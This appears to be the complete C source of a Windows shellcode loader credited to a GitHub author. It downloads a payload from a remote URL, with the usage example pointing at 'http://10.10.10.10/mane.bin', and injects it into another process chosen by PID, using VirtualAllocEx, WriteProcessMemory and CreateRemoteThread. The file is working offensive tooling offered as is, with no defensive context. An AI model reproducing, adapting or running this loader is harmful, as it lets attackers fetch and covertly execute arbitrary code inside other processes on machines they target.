#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <wininet.h>
#pragma comment(lib,"wininet")

typedef void (*fp) (void);

int main(int argc, char const* argv[]) {
    printf("===========================================================================================================\n");
    printf(" #####                               #####                       #                                         \n");
    printf("#     # #    # ###### #      #      #     #  ####  #####  ###### #        ####    ##   #####  ###### ##### \n");
    printf("#       #    # #      #      #      #       #    # #    # #      #       #    #  #  #  #    # #      #    #\n");
    printf(" #####  ###### #####  #      #      #       #    # #    # #####  #       #    # #    # #    # #####  #    #\n");
    printf("      # #    # #      #      #      #       #    # #    # #      #       #    # ###### #    # #      ##### \n");
    printf("#     # #    # #      #      #      #     # #    # #    # #      #       #    # #    # #    # #      #   # \n");
    printf(" #####  #    # ###### ###### ######  #####   ####  #####  ###### #######  ####  #    # #####  ###### #    #\n");
    printf("-----------------------------------------------------------------------------------------------------------\n");
    printf("               ##   https://github.com/manesec/shellcodeloader4mane   x  @manesec   ##\n");
    printf("===========================================================================================================\n\n");
	if (argc == 3)
	{

        HINTERNET hInternet, hConnect;
        const char* url = argv[2];

        // Initialize WinINet
        hInternet = InternetOpenA("HTTP Download", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (hInternet == NULL) {
            printf("[ERROR] Failed to initialize WinINet.\n");
            return -1;
        }

        // Open the connection
        hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
        if (hConnect == NULL) {
            printf("[ERROR] Failed to open the connection.\n");
            InternetCloseHandle(hInternet);
            return -1;
        }

        
        // Download shellcode
		printf("[INFO] Downloading shellcode ");
        char* CommitBuffer = NULL;
        int HTTPBufferSize = 1024 * 1024;  // 1MB Buffer
        char* HTTPTMPbuffer = (char *)malloc(HTTPBufferSize * sizeof(char));

        DWORD realFileSize = 0;
		DWORD bytesRead = 0;
		DWORD ReadTimes = 0;
        while (InternetReadFile(hConnect, HTTPTMPbuffer,HTTPBufferSize, &bytesRead) && bytesRead > 0) {
            realFileSize += bytesRead;
            printf(".");

            if (ReadTimes == 0) {
                CommitBuffer = (char*)malloc(HTTPBufferSize * sizeof(char));
                memcpy(CommitBuffer, HTTPTMPbuffer, bytesRead);
            } else {
                char* tmpBuffer =  (char*)malloc( (HTTPBufferSize * sizeof(char)) * ReadTimes + bytesRead);
                memcpy(tmpBuffer, CommitBuffer, (HTTPBufferSize * sizeof(char)) * ReadTimes);
                memcpy(tmpBuffer + (HTTPBufferSize * sizeof(char)) * ReadTimes, HTTPTMPbuffer, bytesRead);
                free(CommitBuffer);
                CommitBuffer = tmpBuffer;
            }

            ReadTimes++; 
        }

        printf("\n[INFO] Final Size: %lu \n" , realFileSize);
		printf("[INFO] Allocating Memory ...\n");

        // Load shellcode
		char* buffer = NULL;
		buffer = (char*)VirtualAlloc(NULL,realFileSize + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        memcpy(buffer, CommitBuffer, realFileSize);
        free(CommitBuffer);
		if (buffer != NULL)
		{

			HANDLE processHandle;
			HANDLE remoteThread;
			PVOID remoteBuffer;
		
			// 2. inject the shellcode into the process
			printf("[INFO] Injecting to PID: %i \n", atoi(argv[1]));
			processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));

			if (processHandle == NULL)
			{
				printf("[ERROR] Could not open process handle.");
				return 1;
			}

			// 3. allocate executable-read-write (XRW) memory for payload
			printf("[INFO] Allocating memory for buffer.\n");
			remoteBuffer = VirtualAllocEx(processHandle, NULL, realFileSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
			if (remoteBuffer == NULL)
			{
				printf("[ERROR] Could not allocate memory for buffer.");
				return 1;
			}

			// 4. write payload to allocated memory
			printf("[INFO] Writing shellcode to buffer.\n");
			WriteProcessMemory(processHandle, remoteBuffer, buffer, realFileSize, NULL);
			remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);

			printf("[INFO] Let's execute shellcode ...\n");
			printf("[INFO] NT Return : %lx \n", remoteThread);

			if (remoteThread == NULL)
			{
				printf("[ERROR] Could not create remote thread.");
				return 1;
			}

			CloseHandle(processHandle);

			printf("[INFO] Shell Loading Done.\n");
			VirtualFree(buffer, 0, MEM_RELEASE);
			return 0;
		}
		else
		{
			printf("[ERROR] Could not allocate memory for buffer.\n");

		}

        // Cleanup
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);

        return 0;
	}
	else
	{
		printf("InjectFromHTTPWithC.exe PID <http://10.10.10.10/mane.bin>");
		return -1;
	}

}